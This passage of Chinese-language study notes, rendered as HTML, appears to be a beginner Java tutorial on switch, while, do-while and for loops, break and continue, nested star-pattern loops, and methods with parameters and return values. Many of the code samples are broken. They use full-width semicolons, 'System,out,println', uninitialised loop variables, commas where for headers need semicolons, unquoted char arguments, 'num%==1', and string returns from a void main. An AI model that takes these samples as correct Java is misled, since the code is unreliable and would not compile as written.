class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;银行简写&quot;</span>);</span><br><span class="line">        String bank=scanner.next();</span><br><span class="line">        <span class="keyword">switch</span>(bank)&#123;</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;icbc&quot;</span>:</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;ICBC&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;工商银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;                 </span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;bc&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;中国银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;cbc&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;建设银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span></span><br><span class="line">                  System.out.println(<span class="string">&quot;输入有误&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>使用toLowerCase()可以把大写转成小写</p><p>switch(bank.toLowerCase())</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aaa1ea1.png" alt="image-20240313115019616"></p><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p>概念：通过某个条件，重复执行一段逻辑代码</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4abb65f9.png" alt="image-20240318083142151"></p><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad52e53.png" alt="image-20240318083315614"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次输出HelloWorld&quot;</span>);</span><br><span class="line">            i++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4192e2.png" alt="image-20240318084223134"></p><p>while是先判断后执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求和 1-100总和 奇数和 偶数和</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>,odd=<span class="number">0</span>,even=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum=sum+i;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                odd+=i;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                even+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;odd=&quot;</span>+odd);</span><br><span class="line">        System.out.println(<span class="string">&quot;even=&quot;</span>+even);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="do-whlie"><a href="#do-whlie" class="headerlink" title="do-whlie"></a>do-whlie</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac192dc.png" alt="image-20240318085719545"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab38a6f.png" alt="image-20240318085754781"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> score;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第一阶段成绩为：&quot;</span>)；</span><br><span class="line">                score=scanner.nextInt();</span><br><span class="line">        &#125;<span class="keyword">while</span>(score&lt;<span class="number">60</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;本阶段考试成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">do</span>&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次输出HelloWorld&quot;</span>);</span><br><span class="line">           i++</span><br><span class="line">       &#125; <span class="keyword">while</span>(i&lt;=<span class="number">100</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;结束&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b37b416.png" alt="image-20240318091044774"></p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5d44a4.png" alt="image-20240318091239565"></p><p>for循环是从while循环演变过来的，所以他们之间可以互相转换</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//累乘</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System,out,println(<span class="string">&quot;输入一个数&quot;</span>)；</span><br><span class="line">        <span class="type">int</span> mul=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> n=scanner.nextInt();</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            mul=mul*i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(mul);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            sum+=score;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均分为&quot;</span>+sum/<span class="number">5</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1327db.png" alt="image-20240318092620473"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个数字&quot;</span>)；</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;完成，此时i为：&quot;</span>+i)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>Break后会直接跳过后续代码，且for中不会I++</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(score&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入异常，终止输入&quot;</span>)；</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum+=score;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;本次录入无效&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;当前人数为：&quot;</span>+count+<span class="string">&quot;平均分为&quot;</span>+sum/count)；</span><br><span class="line">             &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b20efbd.png" alt="image-20240318094033665"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个数字&quot;</span>)；</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;完成，此时i为：&quot;</span>+i)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>会跳过后续代码，但会继续执行循环，执行i++</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均分</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;名同学分数：&quot;</span>)；</span><br><span class="line">                <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span>scanner.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(score&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入异常，重新输入&quot;</span>)；</span><br><span class="line">                    </span><br><span class="line"> i--;                   <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum+=score;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;平均分为&quot;</span>+sum/<span class="number">5</span>)；</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="嵌套循环"><a href="#嵌套循环" class="headerlink" title="嵌套循环"></a>嵌套循环</h3><p>概念：在一个完整的循环结构中，嵌套另一个完整的循环</p><p><strong>外层循环循环一次，内存循环循环一轮</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三行五列*</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="comment">//外层循环控制行数，内层循环控制列数</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">           System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           System.out.println();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><strong>外层循环控制行数，内层循环控制列数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计算三个班，每个班5名同学的平均成绩</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个班，第&quot;</span>+j+<span class="string">&quot;个同学的成绩是：&quot;</span>);</span><br><span class="line">                sum+=scanner.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个班的平均分是：&quot;</span>+sum/<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打印图型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//打印正直角三角形</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=i,j++)&#123;<span class="comment">//通过i来控制j </span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印反的直角三角形</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=i,j++)&#123;<span class="comment">//通过i来控制j 打印*</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印等腰三角形</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*i-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 1，3，5，7，9找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印菱形</span></span><br><span class="line"><span class="comment">//打印菱形上半部分</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*i-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 1，3，5，7，9找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印菱形下半部分</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="comment">//用一个循环来打印空格</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j;j&lt;=<span class="number">2</span>*(<span class="number">5</span>-i)-<span class="number">1</span>,j++)&#123;<span class="comment">//通过i来控制j 打印* 7,5,3,1找规律</span></span><br><span class="line">System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h2 id="方法与函数"><a href="#方法与函数" class="headerlink" title="方法与函数"></a>方法与函数</h2><p>实际上方法就是函数，只是在面向对象编程中，将函数称为方法</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1ca20d.png" alt="image-20240320113041653"></p><p><strong>在java中不允许在方法中定义方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b35464c.png" alt="image-20240320113240845"></p><p>所以只有2和4能定义方法</p><p>main方法是程序的入口，一开始程序就会执行，而普通方法必须在main方法中进行调用才能执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;窗前明月光，&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;疑是地上霜。&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;举头望明月，&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">System.out.println(<span class="string">&quot;低头思故乡。&quot;</span>);</span><br><span class="line">printSign();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printSign</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要执行代码的地方，通过方法名称进行调用方法</p><p>调用方法时，会优先执行方法内部代码，结束后，返回到方法调用处，继续向下执行</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>形参与实参</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b24409d.png" alt="image-20240325085238714"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;窗前明月光，&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,#);</span><br><span class="line">System.out.println(<span class="string">&quot;疑是地上霜。&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,$);</span><br><span class="line">System.out.println(<span class="string">&quot;举头望明月，&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,%);</span><br><span class="line">System.out.println(<span class="string">&quot;低头思故乡。&quot;</span>);</span><br><span class="line">printSign(<span class="number">10</span>,^);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printSign</span><span class="params">(<span class="type">int</span> count,<span class="type">char</span> sign)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=count;i++)&#123;</span><br><span class="line">            System.out.println(sign);</span><br><span class="line">    &#125;</span><br><span class="line">        System.out.println();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>参数是调用者给方法的输入，返回值是方法给调用者的反馈</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab3dd57.png" alt="image-20240325090312312"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2a02f3.png" alt="image-20240325090450620"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> b;</span><br><span class="line">        <span class="type">int</span>  <span class="variable">c</span> <span class="operator">=</span> add(a,b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><strong>返回值只能有一个，也就是说返回过来的值只能有一个</strong></p><p>即：<strong>不能有</strong>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这种要写成两个方法</span></span><br></pre></td></tr></table></figure><p>但是这种可以：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> b;</span><br><span class="line">        <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;偶数&quot;</span>；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;奇数&quot;</span>；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>同时这种不行：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;偶数&quot;</span>；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num%==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;奇数&quot;</span>；</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//至少要加这个 return &quot;xx&quot;；</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>因为编译器认为你else if后面可能还有if 而if后没有返回值 报错，所以至少要在后面再加一个返回值</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab12442.png" alt="image-20240325093005531"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b20bb4b.png" alt="image-20240325093124926"></p><p>如果此时是break,是指跳到for循环外，继续执行后续代码，这里是到}外</p><p>而return,在无返回值时可写可不写，写了就表示结束方法，这里时回到{</p><h3 id="调用与递归"><a href="#调用与递归" class="headerlink" title="调用与递归"></a>调用与递归</h3><h4 id="多级调用："><a href="#多级调用：" class="headerlink" title="多级调用："></a>多级调用：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        m1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 